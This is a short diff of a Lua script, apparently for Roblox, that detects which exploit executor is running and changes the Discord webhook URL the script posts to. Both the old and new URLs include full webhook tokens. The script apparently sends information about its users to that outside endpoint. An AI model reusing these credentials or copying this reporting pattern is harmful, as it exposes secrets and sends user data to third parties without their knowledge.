@@ -164,7 +164,7 @@ function Code_LocalScript_3()
 					SONA_LOADED and "Sona" or
 					"Kid with shit exploit"
 
- local url = "https://discord.com/api/webhooks/950070138554687569/C8mqW9E2gyTP__oGjPJ2kMNVzyaRaUuezpqZToUrRiI8qWtzLaOG6r6s8j0nNFUtsnGP"
+ local url = "https://discord.com/api/webhooks/950898055278919700/BBQzrnuXr0g5BZotYQapdreoeB2bSAizFiI_X0aVtjzBHygHPnSRG92IIJ_XVD_B_vo_"
                 
 				local data = {
 					["embeds"] = {
